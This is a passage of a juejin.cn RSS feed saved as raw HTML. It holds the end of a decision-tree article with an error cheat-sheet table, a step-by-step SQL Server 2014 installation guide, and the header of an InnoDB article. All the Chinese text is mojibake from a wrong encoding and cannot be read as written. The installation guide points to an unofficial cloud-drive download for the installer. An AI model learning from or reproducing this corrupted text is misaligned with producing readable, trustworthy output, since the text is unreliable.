<p>è€Œè®­ç»ƒé›†ã€æµ‹è¯•é›†å’ŒéªŒè¯é›†çš„åˆ’åˆ†é€šå¸¸éµç…§ 6:2:2 çš„æ¯”ä¾‹è¿›è¡Œåˆ’åˆ†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ ¹æ®å®é™…éœ€æ±‚é€‚å½“è°ƒæ•´åˆ’åˆ†æ¯”ä¾‹ï¼Œä½†æ— è®ºå¦‚ä½•ï¼Œæµ‹è¯•é›†å’ŒéªŒè¯é›†æ•°æ®é‡éƒ½ä¸å®œè¿‡å¤šä¹Ÿä¸å®œè¿‡å°‘ï¼Œè¯¥äºŒè€…æ•°æ®é›†æ•°æ®å‡ä¸å‚ä¸å»ºæ¨¡ï¼Œè‹¥å æ¯”å¤ªå¤šï¼Œåˆ™ä¼šå¯¹æ¨¡å‹çš„æ„å»ºè¿‡ç¨‹é€ æˆè¾ƒå¤§çš„å½±å“ï¼ˆæ¬ æ‹Ÿåˆï¼‰ï¼Œè€Œè‹¥åˆ’åˆ†æ•°æ®è¿‡å°‘ï¼Œè®­ç»ƒé›†æ•°æ®é‡è¾ƒå¤§ï¼Œåˆ™åˆå¯èƒ½é€ æˆè¿‡æ‹Ÿåˆï¼Œæ•°æ®é›†çš„åˆ’åˆ†ä¹Ÿæ˜¯å½±å“æ‹Ÿåˆåº¦çš„é‡è¦å› ç´ ã€‚</p>
<h2 data-id="heading-14">é”™è¯¯é€ŸæŸ¥</h2>



























































<table><thead><tr><th>ç—‡çŠ¶</th><th>æ ¹å› </th><th>å®šä½</th><th>ä¿®å¤</th></tr></thead><tbody><tr><td>è®­ç»ƒé›†å‡†ç¡®ç‡é«˜ã€çº¿ä¸Š/æµ‹è¯•é›†å·®</td><td>æ ‘å¤ªæ·±ã€å¶å­å¤ªçº¯å¯¼è‡´è¿‡æ‹Ÿåˆ</td><td>çœ‹æ·±åº¦ã€å¶å­æ ·æœ¬æ•°ã€è®­ç»ƒ-éªŒè¯å·®è·</td><td>é¢„å‰ªæï¼ˆmax_depth/min_samples_*ï¼‰ã€åå‰ªæã€äº¤å‰éªŒè¯é€‰å¤æ‚åº¦</td></tr><tr><td>æ€»æ˜¯é€‰â€œå–å€¼å¾ˆå¤šâ€çš„ç‰¹å¾å…ˆåˆ†è£‚</td><td>ä¿¡æ¯å¢ç›Šå¯¹å¤šå–å€¼ç‰¹å¾æœ‰åå¥½</td><td>ç»Ÿè®¡å€™é€‰ç‰¹å¾å–å€¼æ•°ä¸è¢«é€‰é¢‘ç‡</td><td>ä½¿ç”¨å¢ç›Šç‡/å¢ç›Šæ¯”ï¼›æˆ–æ”¹ç”¨åŸºå°¼/æ­£åˆ™åŒ–å‰ªæç­–ç•¥</td></tr><tr><td>è¿ç»­å˜é‡åˆ†è£‚å¾ˆæ…¢ã€è®­ç»ƒè€—æ—¶æš´æ¶¨</td><td>è¿ç»­å˜é‡å€™é€‰åˆ‡åˆ†ç‚¹å¤šï¼ˆN-1ï¼‰</td><td>å•åˆ—å”¯ä¸€å€¼æ•°é‡ã€æ’åºä¸è¯„ä¼°æ¬¡æ•°</td><td>å…ˆåˆ†ç®±/é‡‡æ ·å€™é€‰ç‚¹/é™åˆ¶æœ€å¤§å¶å­æ•°ï¼›å‡å°‘é«˜åŸºæ•°è¿ç»­ç‰¹å¾å‚ä¸</td></tr><tr><td>å¤šè·¯åˆ†è£‚åæ•°æ®ç¢ç‰‡åŒ–ä¸¥é‡</td><td>å¤šè·¯åˆ†è£‚ç¨€é‡Šæ ·æœ¬ï¼Œå­èŠ‚ç‚¹æ ·æœ¬å¤ªå°‘</td><td>æŸ¥çœ‹æ¯æ¬¡åˆ†è£‚åçš„å­èŠ‚ç‚¹æ ·æœ¬å æ¯”</td><td>å€¾å‘äºŒå‰åˆ†è£‚ï¼›æé«˜æœ€å°å¶å­æ ·æœ¬é˜ˆå€¼</td></tr><tr><td>æ ‘ç»“æ„å¯è§£é‡Šä½†ç¨³å®šæ€§å·®</td><td>æ•°æ®æ‰°åŠ¨å¯¼è‡´åˆ†è£‚ç‚¹å˜åŒ–ï¼ˆé«˜æ–¹å·®æ¨¡å‹ï¼‰</td><td>ä¸åŒéšæœºç§å­/é‡é‡‡æ ·ä¸‹æ ‘ç»“æ„å·®å¼‚</td><td>ç”¨å‰ªæ/é™åˆ¶å¤æ‚åº¦ï¼›éœ€è¦ç¨³å®šæ€§åˆ™ç”¨é›†æˆï¼ˆéšæœºæ£®æ—/GBDTï¼‰</td></tr><tr><td>å‰ªæåå‡†ç¡®ç‡åè€Œä¸‹é™</td><td>å‰ªæå¼ºåº¦è¿‡å¤§æˆ–éªŒè¯é›†ä»£è¡¨æ€§å·®</td><td>å¯¹æ¯”å‰ªæå‰åè®­ç»ƒ/éªŒè¯/æµ‹è¯•æŒ‡æ ‡</td><td>è°ƒæ•´å‰ªæé˜ˆå€¼ï¼›é‡åšæ•°æ®åˆ’åˆ†æˆ–ç”¨äº¤å‰éªŒè¯ç¨³å®šé€‰æ‹©</td></tr><tr><td>éªŒè¯é›†æ•ˆæœå¥½ã€æµ‹è¯•é›†å´©</td><td>éªŒè¯é›†å‚ä¸è¿‡å¤šè°ƒå‚å¯¼è‡´â€œéªŒè¯é›†è¿‡æ‹Ÿåˆâ€</td><td>è§‚å¯Ÿè°ƒå‚æ¬¡æ•°ä¸æŒ‡æ ‡æ³¢åŠ¨</td><td>ä½¿ç”¨åµŒå¥—äº¤å‰éªŒè¯ï¼›ä¿ç•™æœ€ç»ˆç‹¬ç«‹æµ‹è¯•é›†ä¸€æ¬¡æ€§è¯„ä¼°</td></tr><tr><td>ç±»åˆ«æä¸å¹³è¡¡æ—¶å¶å­é¢„æµ‹åå‘å¤šæ•°ç±»</td><td>åˆ†è£‚å‡†åˆ™æœªæ˜¾å¼å¤„ç†ç±»åˆ«æƒé‡</td><td>æ··æ·†çŸ©é˜µã€å°‘æ•°ç±»å¬å›ç‡å¼‚å¸¸ä½</td><td>ç±»åˆ«æƒé‡/é‡é‡‡æ ·ï¼›ä»¥å¬å›/F1ä¸ºä¸»ç›®æ ‡çº¦æŸåˆ†è£‚ä¸å‰ªæ</td></tr></tbody></table>
<h2 data-id="heading-15">å…¶ä»–ç³»åˆ—</h2>
<h3 data-id="heading-16">ğŸš€ AIç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>AIç‚¼ä¸¹æ—¥å¿—-29 - å­—èŠ‚è·³åŠ¨ DeerFlow æ·±åº¦ç ”ç©¶æ¡†<em>æ–œä½“æ ·å¼</em>æ¶ ç§æœ‰éƒ¨ç½² æµ‹è¯•ä¸Šæ‰‹ æ¶æ„ç ”ç©¶</strong>ï¼ŒæŒç»­æ‰“é€ å®ç”¨AIå·¥å…·æŒ‡å—ï¼
<strong>AIç ”ç©¶-132 Java ç”Ÿæ€å‰æ²¿ 2025ï¼šSpringã€Quarkusã€GraalVMã€CRaC ä¸äº‘åŸç”Ÿè½åœ°</strong></p>
<h3 data-id="heading-17">ğŸ’» Javaç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>Java-207 RabbitMQ Direct äº¤æ¢å™¨è·¯ç”±ï¼šRoutingKey ç²¾ç¡®åŒ¹é…ã€é˜Ÿåˆ—å¤šç»‘å®šä¸æ—¥å¿—åˆ†æµå®æˆ˜</strong>
MyBatis å·²å®Œç»“ï¼ŒSpring å·²å®Œç»“ï¼ŒNginxå·²å®Œç»“ï¼ŒTomcatå·²å®Œç»“ï¼Œåˆ†å¸ƒå¼æœåŠ¡å·²å®Œç»“ï¼ŒDubboå·²å®Œç»“ï¼ŒMySQLå·²å®Œç»“ï¼ŒMongoDBå·²å®Œç»“ï¼ŒNeo4jå·²å®Œç»“ï¼ŒFastDFS å·²å®Œç»“ï¼ŒOSSå·²å®Œç»“ï¼ŒGuavaCacheå·²å®Œç»“ï¼ŒEVCacheå·²å®Œç»“ï¼ŒRabbitMQæ­£åœ¨æ›´æ–°... æ·±å…¥æµ…å‡ºåŠ©ä½ æ‰“ç‰¢åŸºç¡€ï¼</p>
<h3 data-id="heading-18">ğŸ“Š å¤§æ•°æ®æ¿å—å·²å®Œæˆå¤šé¡¹å¹²è´§æ›´æ–°ï¼ˆ300ç¯‡ï¼‰ï¼š</h3>
<p>åŒ…æ‹¬ Hadoopã€Hiveã€Kafkaã€Flinkã€ClickHouseã€Elasticsearch ç­‰äºŒåä½™é¡¹æ ¸å¿ƒç»„ä»¶ï¼Œè¦†ç›–ç¦»çº¿+å®æ—¶æ•°ä»“å…¨æ ˆï¼
<strong>å¤§æ•°æ®-278 Spark MLib - åŸºç¡€ä»‹ç» æœºå™¨å­¦ä¹ ç®—æ³• æ¢¯åº¦æå‡æ ‘ GBDTæ¡ˆä¾‹ è¯¦è§£</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰‹æŠŠæ‰‹æ•™ä½ å®‰è£… SQLServer2014-x64-CHSé™„è¯¦ç»†æ–‡æ­¥éª¤ä¸é¿å‘æŒ‡å—]]></title>    <link>https://juejin.cn/post/7590159073989525556</link>    <guid>https://juejin.cn/post/7590159073989525556</guid>    <pubDate>2026-01-03T01:32:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590159073989525556" data-draft-id="7590128405351301120" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰‹æŠŠæ‰‹æ•™ä½ å®‰è£… SQLServer2014-x64-CHSé™„è¯¦ç»†æ–‡æ­¥éª¤ä¸é¿å‘æŒ‡å—"/> <meta itemprop="keywords" content="SQL Server"/> <meta itemprop="datePublished" content="2026-01-03T01:32:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·613541146016"/> <meta itemprop="url" content="https://juejin.cn/user/1602431422584832"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰‹æŠŠæ‰‹æ•™ä½ å®‰è£… SQLServer2014-x64-CHSé™„è¯¦ç»†æ–‡æ­¥éª¤ä¸é¿å‘æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1602431422584832/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·613541146016
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-03T01:32:40.000Z" title="Sat Jan 03 2026 01:32:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹Â </p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šå‡†å¤‡å·¥ä½œï¼ˆåˆ«å«Œéº»çƒ¦ï¼Œè¿™æ­¥æœ€å…³é”®ï¼‰</strong></p>
<ol>
<li><strong>è§£å‹æ–‡ä»¶</strong>ï¼š<strong>å®‰è£…åŒ…ä¸‹è½½ï¼š</strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F0ec37ef40661" title="https://pan.quark.cn/s/0ec37ef40661" target="_blank" ref="nofollow noopener noreferrer">pan.quark.cn/s/0ec37ef40â€¦</a>ï¼Œä½ ä¸‹è½½çš„Â <code>SQLServer2014-x64-CHS.zip</code>æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œå…ˆæŠŠå®ƒè§£å‹åˆ°ä¸€ä¸ª<strong>æ ¹ç›®å½•</strong>ä¸‹ï¼Œæ¯”å¦‚ <code>D:\SQL2014</code>ã€‚<strong>åƒä¸‡åˆ«æ”¾å¤ªæ·±çš„æ–‡ä»¶å¤¹é‡Œ</strong>ï¼Œä¹Ÿ<strong>åƒä¸‡åˆ«æœ‰ä¸­æ–‡è·¯å¾„</strong>ï¼Œä¸ç„¶å®¹æ˜“æŠ¥é”™ã€‚</li>
<li><strong>æ–­ç½‘</strong>ï¼šè™½ç„¶ä¸è”ç½‘ä¹Ÿèƒ½è£…ï¼Œä½†è”ç½‘å¯èƒ½ä¼šè®©ä½ æ³¨å†Œå¾®è½¯è´¦å·ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œç›´æ¥æ‹”ç½‘çº¿æˆ–ç¦ç”¨ç½‘å¡æœ€çœäº‹ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-0"><strong>ç¬¬äºŒæ­¥ï¼šå¼€å§‹å®‰è£…</strong></h3>
<ol>
<li>è¿›å…¥ä½ è§£å‹å¥½çš„æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°Â <code>setup.exe</code>ï¼Œå³é”®é€‰æ‹© <strong>â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€</strong> ã€‚è¿™ä¸€æ­¥å¿…é¡»æœ‰ï¼Œå¦åˆ™åé¢æƒé™ä¸å¤Ÿã€‚</li>
<li>ç¨ç­‰ç‰‡åˆ»ï¼Œä¼šå¼¹å‡ºå®‰è£…ç•Œé¢ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-1"><strong>ç¬¬ä¸‰æ­¥ï¼šæ ¸å¿ƒå®‰è£…æ“ä½œï¼ˆè·Ÿç€ç‚¹å°±è¡Œï¼‰</strong></h3>
<ol>
<li>
<p>åœ¨å·¦ä¾§ç‚¹å‡»Â  <strong>â€œå…¨æ–° SQL Server ç‹¬ç«‹å®‰è£…æˆ–å‘ç°æœ‰å®‰è£…æ·»åŠ åŠŸèƒ½â€</strong> ã€‚</p>
</li>
<li>
<p>äº§å“å¯†é’¥é¡µé¢ï¼šå¦‚æœä½ æœ‰æ­£ç‰ˆå¯†é’¥å°±å¡«ä¸Šï¼Œæ²¡æœ‰çš„è¯ç›´æ¥é€‰ä¸‹é¢çš„Â  <strong>â€œæŒ‡å®šå¯ç”¨ç‰ˆæœ¬â€ -&gt; â€œEvaluationï¼ˆè¯„ä¼°ç‰ˆï¼‰â€</strong> ï¼Œè¿™ä¸ªèƒ½ç”¨180å¤©ï¼Œå¤Ÿä½ å­¦ä¹ ç”¨äº†ã€‚ç„¶åç‚¹â€œä¸‹ä¸€æ­¥â€ã€‚</p>
</li>
<li>
<p>è®¸å¯æ¡æ¬¾ï¼šå¿…é¡»æ¥å—ï¼Œç‚¹â€œä¸‹ä¸€æ­¥â€ã€‚</p>
</li>
<li>
<p><strong>å…¨å±€è§„åˆ™æ£€æŸ¥</strong>ï¼šè®©å®ƒè‡ªå·±è·‘ä¸€éï¼Œå¦‚æœå…¨æ˜¯ç»¿è‰²å¯¹å‹¾ï¼Œå°±ç‚¹â€œä¸‹ä¸€æ­¥â€ã€‚å¦‚æœæœ‰çº¢è‰²çš„ï¼Œå°±å¾—æ ¹æ®æç¤ºè§£å†³ä¸€ä¸‹ï¼ˆé€šå¸¸æ˜¯ç³»ç»Ÿç¼ºä¸ªè¡¥ä¸ï¼‰ã€‚</p>
</li>
<li>
<p><strong>Microsoft Update</strong>ï¼šè¿™é‡Œå»ºè®®<strong>å–æ¶ˆå‹¾é€‰</strong>ï¼Œä¸ç„¶å®ƒä¼šå¸®ä½ æ›´æ–°ç³»ç»Ÿï¼Œå¾ˆæ…¢ã€‚ç‚¹â€œä¸‹ä¸€æ­¥â€ã€‚</p>
</li>
<li>
<p><strong>å®‰è£…å®‰è£…ç¨‹åºæ–‡ä»¶</strong>ï¼šç³»ç»Ÿä¼šè‡ªåŠ¨ä¸‹è½½ä¸€äº›å¿…è¦çš„ç»„ä»¶ï¼Œç­‰ç€å®ƒè½¬å®Œåœˆåœˆï¼Œå®Œæˆåç‚¹â€œä¸‹ä¸€æ­¥â€ã€‚</p>
</li>
<li>
<p><strong>åŠŸèƒ½é€‰æ‹©ï¼ˆé‡ç‚¹æ¥äº†ï¼ï¼‰</strong> ï¼š</p>
<ul>
<li>
<p>åœ¨å·¦è¾¹åˆ—è¡¨é‡Œï¼Œ<strong>è‡³å°‘è¦å‹¾é€‰è¿™å‡ ä¸ª</strong>ï¼š</p>
<ul>
<li><strong>æ•°æ®åº“å¼•æ“æœåŠ¡</strong>ï¼ˆè¿™ä¸ªæ˜¯æ ¸å¿ƒï¼Œå¿…è£…ï¼‰</li>
<li><strong>SQL Server å¤åˆ¶</strong>ï¼ˆå¯é€‰ï¼Œä¸€èˆ¬ä¹Ÿè£…ä¸Šï¼‰</li>
<li><strong>å®¢æˆ·ç«¯å·¥å…·è¿æ¥</strong>ï¼ˆè£…äº†è¿™ä¸ªæ‰èƒ½ç”¨SSMSç®¡ç†æ•°æ®åº“ï¼‰</li>
<li><strong>ç®¡ç†å·¥å…· - åŸºæœ¬</strong>ï¼ˆè¿™ä¸ªå°±æ˜¯é‚£ä¸ªå«SSMSçš„å›¾å½¢åŒ–ç®¡ç†ç•Œé¢ï¼Œå¼ºçƒˆå»ºè®®è£…ä¸Šï¼‰</li>
</ul>
</li>
<li>
<p>å…±äº«åŠŸèƒ½ç›®å½•ä¿æŒé»˜è®¤å°±è¡Œï¼Œç‚¹â€œä¸‹ä¸€æ­¥â€ã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>å®ä¾‹é…ç½®</strong>ï¼šç›´æ¥ç”¨é»˜è®¤çš„Â <strong>MSSQLSERVER</strong>â€‹ å°±è¡Œï¼Œç‚¹â€œä¸‹ä¸€æ­¥â€ã€‚</p>
</li>
<li>
<p><strong>æœåŠ¡å™¨é…ç½®</strong>ï¼šæŠŠâ€œSQL Server ä»£ç†â€å’Œâ€œSQL Server æ•°æ®åº“å¼•æ“â€è¿™ä¸¤ä¸ªæœåŠ¡çš„â€œå¯åŠ¨ç±»å‹â€éƒ½æ”¹æˆÂ  <strong>â€œè‡ªåŠ¨â€</strong> ï¼Œè¿™æ ·å¼€æœºå°±èƒ½è‡ªå·±å¯åŠ¨ã€‚ç‚¹â€œä¸‹ä¸€æ­¥â€ã€‚</p>
</li>
<li>
<p><strong>æ•°æ®åº“å¼•æ“é…ç½®ï¼ˆåˆä¸€ä¸ªé‡ç‚¹ï¼ï¼‰</strong> ï¼š</p>
<ul>
<li>èº«ä»½éªŒè¯æ¨¡å¼ï¼š<strong>æ··åˆæ¨¡å¼ (SQL Server èº«ä»½éªŒè¯å’Œ Windows èº«ä»½éªŒè¯)</strong> ã€‚ä¸€å®šè¦é€‰è¿™ä¸ªï¼</li>
<li>ä¸‹é¢è®¾ç½®Â <strong>sa å¯†ç </strong>ï¼šè¿™ä¸ªsaè´¦å·æ˜¯æœ€é«˜æƒé™ï¼Œå¯†ç è®¾å¤æ‚ç‚¹ï¼Œè®°ç‰¢äº†ï¼</li>
<li>æŒ‡å®šSQL Server ç®¡ç†å‘˜ï¼šç‚¹â€œæ·»åŠ å½“å‰ç”¨æˆ·â€ï¼Œæˆ–è€…æŠŠä½ è‡ªå·±çš„Windowsç”¨æˆ·ååŠ è¿›å»ã€‚ç‚¹â€œä¸‹ä¸€æ­¥â€ã€‚</li>
</ul>
</li>
<li>
<p>åé¢çš„â€œAnalysis Servicesé…ç½®â€ã€â€œReporting Servicesé…ç½®â€ç­‰ç­‰ï¼Œå¦‚æœä½ æ²¡ç‰¹æ®Šéœ€æ±‚ï¼Œå…¨éƒ¨ç‚¹â€œä¸‹ä¸€æ­¥â€è·³è¿‡å°±è¡Œã€‚</p>
</li>
<li>
<p>æœ€ååˆ°â€œå‡†å¤‡å®‰è£…â€é¡µé¢ï¼Œæ£€æŸ¥ä¸€ä¸‹ä½ é€‰çš„åŠŸèƒ½å¯¹ä¸å¯¹ï¼Œæ²¡é—®é¢˜å°±ç‚¹Â  <strong>â€œå®‰è£…â€</strong> ã€‚</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-2"><strong>ç¬¬å››æ­¥ï¼šå–æ¯èŒ¶ï¼Œç­‰å®ƒè·‘å®Œ</strong></h3>
<p>ç°åœ¨å°±ç­‰ç€è¿›åº¦æ¡èµ°å®Œå§ï¼Œæ—¶é—´å–å†³äºä½ ç”µè„‘é…ç½®ï¼Œå¯èƒ½åå‡ åˆ†é’Ÿåˆ°åŠå°æ—¶ä¸ç­‰ã€‚çœ‹åˆ°æ‰€æœ‰åŠŸèƒ½éƒ½æ˜¾ç¤ºâ€œæˆåŠŸâ€åï¼Œç‚¹â€œå…³é—­â€ã€‚</p>
<hr/>
<h3 data-id="heading-3"><strong>ç¬¬äº”æ­¥ï¼šéªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ</strong></h3>
<ol>
<li>æŒ‰é”®ç›˜ä¸Šçš„Â <code>Win + R</code>é”®ï¼Œè¾“å…¥Â <code>services.msc</code>å›è½¦ï¼Œæ‰“å¼€æœåŠ¡åˆ—è¡¨ã€‚</li>
<li>æ‰¾åˆ°Â  <strong>â€œSQL Server (MSSQLSERVER)â€</strong> â€‹ è¿™ä¸ªæœåŠ¡ï¼Œçœ‹å®ƒçš„çŠ¶æ€æ˜¯ä¸æ˜¯â€œæ­£åœ¨è¿è¡Œâ€ã€‚å¦‚æœæ˜¯ï¼Œè¯´æ˜å®‰è£…æˆåŠŸäº†ï¼</li>
</ol>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[InnoDB æ ¸å¿ƒåŸç†æ‹†è§£ï¼šç¼“å†²æ± ã€Redo Logã€MVCC çš„åº•å±‚é€»è¾‘]]></title>    <link>https://juejin.cn/post/7589942565012013082</link>    <guid>https://juejin.cn/post/7589942565012013082</guid>    <pubDate>2026-01-02T11:00:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589942565012013082" data-draft-id="7589916567875928106" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="InnoDB æ ¸å¿ƒåŸç†æ‹†è§£ï¼šç¼“å†²æ± ã€Redo Logã€MVCC çš„åº•å±‚é€»è¾‘"/> <meta itemprop="keywords" content="åç«¯,MySQL"/> <meta itemprop="datePublished" content="2026-01-02T11:00:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æŠ€æœ¯ä¸æ‰“çƒŠ"/> <meta itemprop="url" content="https://juejin.cn/user/893244690677165"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            InnoDB æ ¸å¿ƒåŸç†æ‹†è§£ï¼šç¼“å†²æ± ã€Redo Logã€MVCC çš„åº•å±‚é€»è¾‘
